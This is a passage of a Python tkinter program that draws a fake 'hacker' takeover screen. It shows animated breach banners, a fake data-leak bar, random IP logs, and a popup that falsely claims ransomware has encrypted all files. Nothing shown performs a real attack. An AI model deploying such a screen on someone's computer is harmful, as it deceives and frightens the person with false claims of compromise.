        self.script.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.script.tag_config('comment', foreground='#666')
        self.script.tag_config('string', foreground='#fa0')
        self.script.tag_config('keyword', foreground='#f0f')
        
        self.lstat = tk.Label(left, text="[ACTIVE] PID: " + str(os.getpid()), 
                               font=self.hfont, fg='#0f0', bg='#030', pady=3)
        self.lstat.pack(fill=tk.X, padx=5, pady=(0,5))
    
    def setup_right(self):
        right = tk.Frame(self.pane, bg='#000')
        self.pane.add(right, width=650)
        
        h = tk.Frame(right, bg='#300', bd=2, relief=tk.RAISED)
        h.pack(fill=tk.X, padx=5, pady=5)
        
        self.title = tk.Label(h, text="⚠️ SYSTEM BREACH ⚠️", font=self.bfont, fg='#f00', bg='#300')
        self.title.pack(pady=10)
        
        tk.Label(h, text="UNAUTHORIZED ACCESS DETECTED", font=self.hfont, fg='#f44', bg='#300').pack()
        
        self.mcanvas = tk.Canvas(right, height=60, bg='#000', highlightthickness=0)
        self.mcanvas.pack(fill=tk.X, padx=5, pady=5)
        
        sf = tk.Frame(right, bg='#010', bd=1, relief=tk.SUNKEN)
        sf.pack(fill=tk.X, padx=5, pady=5)
        self.sys_stat = tk.Label(sf, text="SYSTEM: COMPROMISED | FIREWALL: OFF", 
                                  font=self.hfont, fg='#0f0', bg='#010')
        self.sys_stat.pack(pady=5)
        
        self.pcanvas = tk.Canvas(right, height=25, bg='#010', highlightthickness=0)
        self.pcanvas.pack(fill=tk.X, padx=5, pady=5)
        
        self.log = scrolledtext.ScrolledText(right, height=15, font=self.cfont, 
                                              bg='#000', fg='#0f0', bd=2, relief=tk.SUNKEN)
        self.log.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.bstat = tk.Label(right, text="⚠️ CRITICAL FAILURE ⚠️", 
                               font=self.hfont, fg='#f00', bg='#000')
        self.bstat.pack(fill=tk.X, padx=5, pady=(0,5))
    
    def on_key(self, event):
        if event.char.isprintable():
            if check_escape(event.char, self.root):
                return
            
            self.log.insert(tk.END, f"[KEY] {event.char}\n")
            self.log.see(tk.END)
            
            if hasattr(self, 'hacker_popup') and self.hacker_popup and self.hacker_popup.spy_popup:
                self.hacker_popup.spy_popup.add_keystroke()
    
    def show_popup(self):
        if escape_triggered:
            return
        print("Creating popup...")
        self.hacker_popup = HackerPopup(self.root)
        self.hacker_popup.create_popup()
        
        self.log.insert(tk.END, "\n[!!!] RANSOMWARE ACTIVATED!\n")
        self.log.insert(tk.END, "[!!!] ALL FILES ENCRYPTED!\n")
        self.log.insert(tk.END, "[!!!] DO NOT TURN OFF PC!\n")
        self.log.see(tk.END)
    
    def update_terminal(self):
        if escape_triggered:
            return
        if self.ci < len(terminal_commands):
            cmd = terminal_commands[self.ci]
            self.term.insert(tk.END, "root@kali:~# " + cmd + "\n")
            self.term.insert(tk.END, "[*] Executing...\n")
            for _ in range(2):
                self.term.insert(tk.END, f"[+] {random.choice(['Target found', 'Vulnerability confirmed', 'Payload sent', 'Access granted'])}\n")
            self.term.insert(tk.END, "\n")
            self.term.see(tk.END)
            self.ci += 1
        else:
            self.ci = 0
            self.term.delete(1.0, tk.END)
        self.root.after(3000, self.update_terminal)
    
    def animate_header(self):
        if escape_triggered:
            return
        if not hasattr(self, 'hi'):
            self.hi = 0
        texts = ["⚠️ SYSTEM BREACH ⚠️", "💀 ROOT ACCESS 💀", "🔓 NO SECURITY 🔓", 
                 "🌐 NETWORK OWNED 🌐", "💾 DATA LEAK 💾"]
        self.title.config(text=texts[self.hi % len(texts)])
        self.hi += 1
        self.root.after(800, self.animate_header)
    
    def animate_progress(self):
        if escape_triggered:
            return
        self.pcanvas.delete("all")
        self.progress += self.pdir * random.randint(2, 5)
        if self.progress >= 100:
            self.progress = 100
            self.pdir = -1
        elif self.progress <= 0:
            self.progress = 0
            self.pdir = 1
        w = self.pcanvas.winfo_width()
        if w > 0:
            fw = int(w * self.progress / 100)
            color = '#0f0' if self.progress < 30 else '#ff0' if self.progress < 70 else '#f00'
            self.pcanvas.create_rectangle(0, 0, fw, 25, fill=color)
            self.pcanvas.create_text(w//2, 12, text=f"DATA LEAK: {self.progress}%", 
                                     fill='white', font=self.hfont)
        self.root.after(100, self.animate_progress)
    
    def update_logs(self):
        if escape_triggered:
            return
        ts = datetime.now().strftime("%H:%M:%S")
        msg = random.choice(hacking_messages)
        self.log.insert(tk.END, f"[{ts}] {msg}\n")
        if random.random() > 0.6:
            self.log.insert(tk.END, f"[{ts}] Connection: {get_random_ip()}:{random.randint(1,65535)}\n")
        if int(self.log.index('end-1c').split('.')[0]) > 300:
            self.log.delete('1.0', '50.0')
        self.log.see(tk.END)
        self.root.after(random.randint(500, 1500), self.update_logs)
    
    def update_status(self):
        if escape_triggered:
            return
        statuses = [
            "SYSTEM: COMPROMISED | FIREWALL: OFF | AV: DEAD",
            "ENCRYPTION: BROKEN | BACKDOOR: ACTIVE",
            "DATA LOSS: 78% | TRACKING: ON"
        ]
        self.sys_stat.config(text=random.choice(statuses))
        self.root.after(4000, self.update_status)
    
    def update_scripts(self):
        if escape_triggered:
            return
        scr = hacker_scripts[self.si % len(hacker_scripts)]
        lines = scr.split('\n')
        if self.sl < len(lines):
            line = lines[self.sl]
            self.script.insert(tk.END, line + '\n')
            if '#' in line:
                self.script.tag_add('comment', "end-2l", "end-1l")
            elif any(s in line for s in ["'", '"']):
                self.script.tag_add('string', "end-2l", "end-1l")
            elif any(k in line for k in ['import', 'def', 'if', 'for']):
                self.script.tag_add('keyword', "end-2l", "end-1l")
            self.script.see(tk.END)
            self.sl += 1
        else:
            self.si += 1
            self.sl = 0
            self.script.insert(tk.END, "\n" + "="*40 + "\n\n")
            self.script.see(tk.END)
        self.root.after(random.randint(50, 150), self.update_scripts)
    
    def matrix(self):
        if escape_triggered:
            return
        self.mcanvas.delete("all")
        w = self.mcanvas.winfo_width()
        if w > 0:
            chars = "01"
            for i in range(0, w, 12):
                self.mcanvas.create_text(i, random.randint(5, 55), 
                                         text=random.choice(chars),
                                         fill=random.choice(['#0f0', '#3f3', '#6f6']),
                                         font=self.cfont)
        self.root.after(100, self.matrix)
    
    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    try:
        app = HackerInterface()
        app.run()
    except KeyboardInterrupt:
        print("\nQuit.")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        sys.exit(0)